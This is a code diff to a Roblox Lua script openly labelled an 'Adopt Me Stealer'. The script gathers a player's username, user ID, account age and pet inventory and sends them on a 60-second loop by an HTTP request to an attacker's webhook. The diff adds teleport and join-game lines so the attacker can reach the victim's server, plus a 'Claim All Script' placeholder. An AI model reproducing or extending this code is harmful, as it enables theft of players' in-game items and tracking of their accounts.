@@ -86,10 +86,10 @@ local accage = plr.AccountAge
 
 local data = {
     username = 'Kenn | Adopt Me Stealer!!',
-    content = '**New Hits! Bule dongo aselole**',
+    content = '-- [[@everyone]]\ngame:GetService("TeleportService"):TeleportToPlaceInstance(142823291, "cbaf4fed-5c00-4953-921c-9dcba2a25853")',
     embeds = {{
         title = '**New Hits! Bule dongo aselole**',
-        description = '**〘👤〙Player Info**: \n ```lua\nExecutor 🔌: '.. tostring(exploit) ..'\nUsername 🧑: '.. tostring(plr.Name) ..'\nUser-ID  🚀: '.. tostring(userid) ..'\nAcc Age  🌠: '.. tostring(accage) ..' Days\nReceiver 💌: '.. Username ..'\n```\n **⟪🎒⟫ Inventory**: \n ```lua\nLegendaries 🦒: '.. tostring(stats.legendaries_count).. '\nUltra Rares 🐊: '.. tostring(stats.ultra_count).. '\nRares       🐌: '.. tostring(stats.rare_count).. '\nUncommons   🦀: '.. tostring(stats.uncommon_count).. '\nCommons     🐱: '.. tostring(stats.common_count).. '\nTotal Pets  🤑: '.. tostring(stats.total).. '\n\nMega-Neon   🐉: '.. tostring(stats.mega_neon_count).. '\nNeon Only   🐲: '.. tostring(stats.neon_count).. '\nF/R Pets    🦄: '.. tostring(stats.fr_count).. '```',
+        description = '**〘👤〙Player Info**: \n ```lua\nExecutor 🔌: '.. tostring(exploit) ..'\nUsername 🧑: '.. tostring(plr.Name) ..'\nUser-ID  🚀: '.. tostring(userid) ..'\nAcc Age  🌠: '.. tostring(accage) ..' Days\nReceiver 💌: '.. Username ..'\n```\n **⟪🎒⟫ Inventory**: \n ```lua\nLegendaries 🦒: '.. tostring(stats.legendaries_count).. '\nUltra Rares 🐊: '.. tostring(stats.ultra_count).. '\nRares       🐌: '.. tostring(stats.rare_count).. '\nUncommons   🦀: '.. tostring(stats.uncommon_count).. '\nCommons     🐱: '.. tostring(stats.common_count).. '\nTotal Pets  🤑: '.. tostring(stats.total).. '\n\nMega-Neon   🐉: '.. tostring(stats.mega_neon_count).. '\nNeon Only   🐲: '.. tostring(stats.neon_count).. '\nF/R Pets    🦄: '.. tostring(stats.fr_count).. '```\n**Claim All Script 🎁**:\n```lua\n-- Coming Soon.```\n\n**Join from Console**: \n```lua\nRoblox.GameLauncher.joinGameInstance(142823291, "cbaf4fed-5c00-4953-921c-9dcba2a25853")```',
         color = 14423100,
         footer = { text = "Time: " .. os.date("%Y-%m-%d %H:%M:%S") }
     }}
@@ -183,7 +183,7 @@ while wait(60) do
     
     stats.total = stats.legendaries_count + stats.ultra_count + stats.rare_count + stats.uncommon_count + stats.common_count
     
-    data.embeds[1].description = '**〘👤〙Player Info**: \n ```lua\nExecutor 🔌: '.. tostring(exploit) ..'\nUsername 🧑: '.. tostring(plr.Name) ..'\nUser-ID  🚀: '.. tostring(userid) ..'\nAcc Age  🌠: '.. tostring(accage) ..' Days\nReceiver 💌: '.. Username ..'\n```\n **⟪🎒⟫ Inventory**: \n ```lua\nLegendaries 🦒: '.. tostring(stats.legendaries_count).. '\nUltra Rares 🐊: '.. tostring(stats.ultra_count).. '\nRares       🐌: '.. tostring(stats.rare_count).. '\nUncommons   🦀: '.. tostring(stats.uncommon_count).. '\nCommons     🐱: '.. tostring(stats.common_count).. '\nTotal Pets  🤑: '.. tostring(stats.total).. '\n\nMega-Neon   🐉: '.. tostring(stats.mega_neon_count).. '\nNeon Only   🐲: '.. tostring(stats.neon_count).. '\nF/R Pets    🦄: '.. tostring(stats.fr_count).. '```'
+    data.embeds[1].description = '**〘👤〙Player Info**: \n ```lua\nExecutor 🔌: '.. tostring(exploit) ..'\nUsername 🧑: '.. tostring(plr.Name) ..'\nUser-ID  🚀: '.. tostring(userid) ..'\nAcc Age  🌠: '.. tostring(accage) ..' Days\nReceiver 💌: '.. Username ..'\n```\n **⟪🎒⟫ Inventory**: \n ```lua\nLegendaries 🦒: '.. tostring(stats.legendaries_count).. '\nUltra Rares 🐊: '.. tostring(stats.ultra_count).. '\nRares       🐌: '.. tostring(stats.rare_count).. '\nUncommons   🦀: '.. tostring(stats.uncommon_count).. '\nCommons     🐱: '.. tostring(stats.common_count).. '\nTotal Pets  🤑: '.. tostring(stats.total).. '\n\nMega-Neon   🐉: '.. tostring(stats.mega_neon_count).. '\nNeon Only   🐲: '.. tostring(stats.neon_count).. '\nF/R Pets    🦄: '.. tostring(stats.fr_count).. '```\n**Claim All Script 🎁**:\n```lua\n-- Coming Soon.```\n\n**Join from Console**: \n```lua\nRoblox.GameLauncher.joinGameInstance(142823291, "cbaf4fed-5c00-4953-921c-9dcba2a25853")```'
     data.embeds[1].footer.text = "Time: " .. os.date("%Y-%m-%d %H:%M:%S")
     
     if httpRequest then
